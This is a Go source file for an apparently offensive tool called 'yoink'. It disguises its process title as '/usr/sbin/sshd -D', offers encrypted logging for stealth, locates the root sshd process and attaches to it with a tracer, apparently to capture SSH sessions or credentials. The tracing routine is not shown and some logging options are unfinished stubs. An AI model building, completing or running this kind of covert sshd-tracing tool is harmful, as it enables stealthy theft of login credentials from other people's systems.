package main

import (
	"flag"
	"github.com/lunixbochs/gspt"
	"log"
	"os"

	"./ghostrace/ghost/process"
)

func main() {
	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
	title := fs.String("title", "/usr/sbin/sshd -D", "set process title")
	logPath := fs.String("o", "", "set output file (disables stdout)")
	key := fs.String("key", "", "encrypt logs with key (must be 16 bytes)")
	pid := fs.Int("sshd", 0, "force root sshd pid")
	fs.Parse(os.Args[1:])

	// this changes our title in `ps`
	gspt.SetProcTitle(*title)

	// set up logging
	logger := log.New(os.Stderr, "", 0)
	if *logPath != "" {
		// logger.SetOutput(logPath?????)
	}
	if *key != "" {
		if *logPath == "" {
			log.Println("-key requires -o")
		} else {
			// logger = NewEncryptedLogger(logger, *key)
		}
	}

	// find sshd
	sshd := 0
	if *pid > 0 {
		sshd = *pid
	} else {
		parentSshd, err := process.Filter(func(p process.Process) bool {
			if isSshd(p) {
				return isSshd(p) && !isSshd(p.Parent())
			}
			return false
		})
		if err != nil {
			logger.Fatalf("[-] error searching for sshd: %s\n", err)
		}
		if len(parentSshd) != 1 {
			logger.Fatalf("[-] need (1) root sshd, found (%d)\n", len(parentSshd))
		}
		sshd = parentSshd[0].Pid()
	}
	logger.Printf("[+] started with pid [%d]\n", os.Getpid())
	logger.Printf("[+] attaching to root sshd at [%d]\n", sshd)
	if err := trace(sshd, logger); err != nil {
		logger.Fatalf("[-] error during trace: %s\n", err)
	}
}
